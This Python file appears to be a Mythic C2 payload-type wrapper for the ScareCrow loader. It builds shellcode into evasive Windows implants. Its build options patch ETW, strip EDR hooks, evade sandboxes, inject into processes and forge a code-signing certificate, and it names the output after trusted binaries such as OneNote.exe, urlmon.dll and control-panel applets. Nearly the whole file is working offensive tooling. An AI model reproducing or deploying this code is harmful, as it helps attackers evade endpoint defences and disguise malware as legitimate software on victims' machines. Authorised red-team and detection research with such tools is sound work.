from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
import asyncio
import os
import tempfile
from distutils.dir_util import copy_tree
import base64


class ScarecrowWrapper(PayloadType):
    name = "scarecrow_wrapper"
    file_extension = "exe"
    author = "Kyle Avery"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = []
    note = "Wrap shellcode files in scarecrow's execution"
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Loader - Sets the type of process that will sideload the malicious payload. Note: Binary, Control, and DLL loaders require shellcode as input while Excel, Msiexec, and Wscript loaders require a PE file.",
            choices=["control", "binary", "dll"],
        ),
        BuildParameter(
            name="etw",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="ETW - Enables ETW patching to prevent ETW events from being generated.",
        ),
        BuildParameter(
            name="console",
            parameter_type=BuildParameterType.Boolean,
            description="Console (Only for Binary Payloads) - Generates verbose console information when the payload is executed. This will disable the hidden window feature.",
            default_value=True,
        ),
        BuildParameter(
            name="sandbox",
            parameter_type=BuildParameterType.Boolean,
            description="Sandbox - Enables sandbox evasion using IsDomainedJoined calls.",
            default_value=True,
        ),
        BuildParameter(
            name="unmodified",
            parameter_type=BuildParameterType.Boolean,
            description="Unmodified - (Only for DLL Payloads) When enabled will generate a DLL loader that WILL NOT removing the EDR hooks in system DLLs and only use custom syscalls.",
            default_value=False,
        ),
        BuildParameter(
            name="injection",
            parameter_type=BuildParameterType.String,
            required=False,
            description="Injection - Enables Process Injection Mode and specifies the path to the process to create/inject into (use \ for the path).",
            default_value="",
        ),
        BuildParameter(
            name="domain",
            required=True,
            parameter_type=BuildParameterType.String,
            description="Domain - The domain name to use for creating a fake code signing cert.",
            default_value="www.acme.com",
        ),
    ]
    agent_icon_path = Path(".") / "mythic" / "scarecrow.svg"
    agent_code_path = Path(".") / "agent_code"
    c2_profiles = []

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        output = ""
        try:
            if self.get_parameter("loader") != "dll" and self.get_parameter("unmodified"):
                resp.build_stderr = "Cannot use Unmodified option with a loader type other than DLL!"
                return resp
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid).name
            # shutil to copy payload files over
            copy_tree(str(self.agent_code_path), agent_build_path)
            working_path = "{}/original.exe".format(agent_build_path)
            output_path = "{}/OneNote.exe".format(agent_build_path)

            with open(str(working_path), "wb") as f:
                f.write(self.wrapped_payload)
            with open(str(working_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":  # if PE file
                    resp.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    return resp

            command = "cd {}/ScareCrow/; go build; chmod +x ScareCrow; ./ScareCrow ".format(agent_build_path,
                                                                                            agent_build_path)
            command += "-I {} -Loader {}{}{}{}{}{}".format(
                working_path,
                self.get_parameter("loader"),
                " -noetw" if not self.get_parameter("etw") else "",
                " -console" if self.get_parameter("console") else "",
                " -injection {}".format(self.get_parameter("injection")) if self.get_parameter(
                    "injection") != "" else "",
                " -domain {}".format(self.get_parameter("domain")) if self.get_parameter("domain") != "" else "",
                " -sandbox" if self.get_parameter("sandbox") else "",
                " -unmodified" if self.get_parameter("unmodified") else "",
            )

            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path,
            )
            stdout, stderr = await proc.communicate()
            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if self.get_parameter("loader") == "control":
                names = ["appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol",
                         "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet",
                         "telephone", "datetime", "winsec"]
                extension = ".cpl"
            elif self.get_parameter("loader") == "binary":
                names = ["Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"]
                extension = ".exe"
            elif self.get_parameter("loader") == "dll":
                names = ["apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost",
                         "schannel", "urlmon", "win32u"]
                extension = ".dll"
            else:
                raise Exception(f"Unknown loader parameter: {self.get_parameter('loader')}")

            for name in names:
                output_name = name + extension
                output_path = "{}/ScareCrow/{}".format(agent_build_path, output_name)
                if os.path.exists(output_path):
                    resp.payload = open(output_path, "rb").read()
                    resp.status = BuildStatus.Success
                    resp.build_message = "Command: " + command + "\n" + "New ScareCrow payload created! - {}".format(
                        output_name)
                    return resp
            resp.payload = b""
            resp.build_stderr = "Failed, output: " + output + "\n Output path: " + output_path
        except Exception as e:
            raise Exception(str(e) + "\n" + output)
        return resp
